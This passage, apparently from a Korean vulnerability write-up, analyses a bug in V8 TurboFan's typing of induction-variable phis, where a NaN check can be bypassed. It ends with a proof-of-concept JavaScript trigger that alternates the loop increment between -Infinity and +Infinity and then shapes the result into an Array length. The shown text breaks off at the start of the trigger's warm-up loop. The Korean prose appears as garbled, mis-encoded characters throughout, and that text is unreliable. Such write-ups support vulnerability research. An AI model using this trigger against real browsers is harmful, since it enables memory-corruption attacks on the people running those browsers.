  &lt;span class=&quot;n&quot;&gt;maybe_nan&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;resultant_type&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Maybe&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Type&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;NaN&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;());&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;ë§Œì•½ ì„¤ì •ì´ ë˜ì–´ìˆë‹¤ë©´ ê²°ê³¼ì˜ í˜•ì‹ì„ íŒë‹¨í•˜ëŠ”ë° ì´ ì½”ë“œì—ì„œëŠ” &lt;code class=&quot;highlighter-rouge&quot;&gt;inf&lt;/code&gt;ê°€ ìˆìœ¼ë©´ &lt;code class=&quot;highlighter-rouge&quot;&gt;NaN&lt;/code&gt;ì´ ë‚˜ì˜¬ ìˆ˜ ìˆìœ¼ë‹ˆ ê²€ì‚¬í•œë‹¤ê³  ì í˜€ ìˆë‹¤. &lt;code class=&quot;highlighter-rouge&quot;&gt;-inf&lt;/code&gt; + &lt;code class=&quot;highlighter-rouge&quot;&gt;inf&lt;/code&gt;ê°€ &lt;code class=&quot;highlighter-rouge&quot;&gt;NaN&lt;/code&gt;ì´ ë‚˜ì˜¤ëŠ”ë° ì´ëŸ° ê²½ìš°ì´ë‹¤.&lt;/p&gt;

&lt;div class=&quot;language-cpp highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;// We only handle integer induction variables (otherwise ranges&lt;/span&gt;
&lt;span class=&quot;c1&quot;&gt;// do not apply and we cannot do anything).&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;both_types_integer&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;maybe_nan&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;c1&quot;&gt;// Fallback to normal phi typing, but ensure monotonicity.&lt;/span&gt;
  &lt;span class=&quot;c1&quot;&gt;// (Unfortunately, without baking in the previous type, monotonicity might&lt;/span&gt;
  &lt;span class=&quot;c1&quot;&gt;// be violated because we might not yet have retyped the incrementing&lt;/span&gt;
  &lt;span class=&quot;c1&quot;&gt;// operation even though the increment's type might been already reflected&lt;/span&gt;
  &lt;span class=&quot;c1&quot;&gt;// in the induction variable phi.)&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;Type&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;type&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;NodeProperties&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;IsTyped&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;node&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;?&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;NodeProperties&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;GetType&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;node&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
                                            &lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Type&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;None&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;arity&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;type&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Type&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Union&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;type&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Operand&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;node&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;zone&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;());&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;type&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;ê·¸ë¦¬ê³  ë§Œì•½ &lt;code class=&quot;highlighter-rouge&quot;&gt;NaN&lt;/code&gt;ì´ ë‚˜ì˜¤ê±°ë‚˜, ë‘ ìˆ«ìê°€ &lt;code class=&quot;highlighter-rouge&quot;&gt;kInteger&lt;/code&gt;ê°€ ì•„ë‹Œ ê²½ìš° rangeë¥¼ ì§€ì •í•  ìˆ˜ ì—†ë‹¤ê³  íŒë‹¨í•˜ì—¬ ë“¤ ì–´ì˜¨ íŒŒë¼ë¯¸í„°ì˜ í˜•ì‹ì„ ëª¨ë‘ ë„£ì–´ì£¼ê³  íƒ€ì…ì„ ë˜ëŒë ¤ì¤€ë‹¤.&lt;/p&gt;

&lt;div class=&quot;language-cpp highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;increment_min&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;[...]&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;max&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;std&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;min&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;max&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;bound_max&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;increment_max&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;max&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;std&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;max&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;max&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;initial_type&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Max&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;());&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;increment_max&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
	  &lt;span class=&quot;p&quot;&gt;[...]&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;min&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;std&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;max&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;min&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;bound_min&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;increment_min&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;min&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;std&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;min&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;min&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;initial_type&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Min&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;());&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;c1&quot;&gt;// Shortcut: If the increment can be both positive and negative,&lt;/span&gt;
  &lt;span class=&quot;c1&quot;&gt;// the variable can go arbitrarily far, so just return integer.&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;typer_&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cache_&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;kInteger&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

&lt;span class=&quot;p&quot;&gt;[...]&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Type&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Range&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;min&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;max&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;typer_&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;zone&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;());&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;ê·¸ë¦¬ê³  &lt;code class=&quot;highlighter-rouge&quot;&gt;inc&lt;/code&gt;ì˜ ë¶€í˜¸ì— ë”°ë¼ &lt;code class=&quot;highlighter-rouge&quot;&gt;range&lt;/code&gt;ë¥¼ ë§Œë“¤ê³  ë¦¬í„´í•˜ëŠ”ë° ë¶€í˜¸ê°€ ì–‘ìˆ˜&lt;code class=&quot;highlighter-rouge&quot;&gt;([0, inf])&lt;/code&gt;ë‚˜ ìŒìˆ˜&lt;code class=&quot;highlighter-rouge&quot;&gt;([-inf, 0])&lt;/code&gt;ê°€ ì•„ë‹Œ ê²½ìš°ì—ëŠ” ê·¸ëƒ¥ &lt;code class=&quot;highlighter-rouge&quot;&gt;kInteger&lt;/code&gt;ë¥¼ ë¦¬í„´í•œë‹¤. &lt;code class=&quot;highlighter-rouge&quot;&gt;kInteger&lt;/code&gt;ëŠ” &lt;code class=&quot;highlighter-rouge&quot;&gt;[-V8_INFINITY, V8_INFINITY]&lt;/code&gt;ì˜ ë²”ìœ„ë¥¼ ê°€ì§„ë‹¤.&lt;/p&gt;

&lt;p&gt;ì§€ê¸ˆê¹Œì§€ ì½”ë“œë¥¼ ë³´ë©´, &lt;code class=&quot;highlighter-rouge&quot;&gt;kInteger&lt;/code&gt;íƒ€ì…ìœ¼ë¡œ ë¦¬í„´ì„ í•˜ê²Œ í•˜ë ¤ë©´ &lt;code class=&quot;highlighter-rouge&quot;&gt;kInteger&lt;/code&gt;íƒ€ì…ì˜ &lt;code class=&quot;highlighter-rouge&quot;&gt;start&lt;/code&gt;ì™€ &lt;code class=&quot;highlighter-rouge&quot;&gt;inc&lt;/code&gt;ê°€ ìˆì–´ì•¼ í•˜ë©° &lt;code class=&quot;highlighter-rouge&quot;&gt;inc&lt;/code&gt;ì˜ ë¶€í˜¸ê°€ ìŒìˆ˜ì™€ ì–‘ìˆ˜ë¥¼ ê°€ì ¸ì•¼í•œë‹¤ëŠ” ê²ƒì„ ì•Œ ìˆ˜ ìˆë‹¤. ê·¸ëŸ¬ë©´ì„œ &lt;code class=&quot;highlighter-rouge&quot;&gt;start&lt;/code&gt;ì™€ &lt;code class=&quot;highlighter-rouge&quot;&gt;inc&lt;/code&gt;ë¥¼ ë”í–ˆì„ ë•Œ &lt;code class=&quot;highlighter-rouge&quot;&gt;NaN&lt;/code&gt;ì´ ë‚˜ì˜¤ê²Œ í•´ì•¼ í•œë‹¤.&lt;/p&gt;

&lt;div class=&quot;language-cpp highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;both_types_integer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;Type&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;resultant_type&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;
      &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;arithmetic_type&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;InductionVariable&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ArithmeticType&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;kAddition&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
          &lt;span class=&quot;o&quot;&gt;?&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;typer_&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;operation_typer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;NumberAdd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;initial_type&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;increment_type&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
          &lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;typer_&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;operation_typer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;NumberSubtract&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;initial_type&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
                                                      &lt;span class=&quot;n&quot;&gt;increment_type&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;maybe_nan&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;resultant_type&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Maybe&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Type&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;NaN&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;());&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;ì´ ì½”ë“œë¥¼ ë³´ë©´ í•œë²ˆë§Œ ì—°ì‚°í•˜ì—¬ &lt;code class=&quot;highlighter-rouge&quot;&gt;NaN&lt;/code&gt;ì¸ì§€ íŒë‹¨í•œë‹¤. í•˜ì§€ë§Œ ë°˜ë³µë¬¸ ë‚´ì—ì„œ incê°’ì´ ë°”ë€ë‹¤ë©´ ì´ ì½”ë“œë¥¼ ìš°íšŒí•˜ì—¬ &lt;code class=&quot;highlighter-rouge&quot;&gt;NaN&lt;/code&gt;ì„ ë§Œë“¤ ìˆ˜ ìˆë‹¤.&lt;/p&gt;

&lt;h2 id=&quot;poc&quot;&gt;PoC&lt;/h2&gt;

&lt;div class=&quot;language-cpp highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;trigger&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;x&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Infinity&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;k&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
      &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Infinity&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;x&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Infinity&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
      &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

      &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;k&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;10&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;break&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
      &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

  &lt;span class=&quot;n&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;value&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Math&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;max&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1024&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;value&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;value&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;value&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Math&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;max&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;value&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1025&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;value&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;value&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;value&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1022&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;value&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// *** 3 ***&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;value&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;10&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;//&lt;/span&gt;

  &lt;span class=&quot;n&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;array&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Array&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;value&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;array&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;1.1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;array&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{}];&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;let&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;20000&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
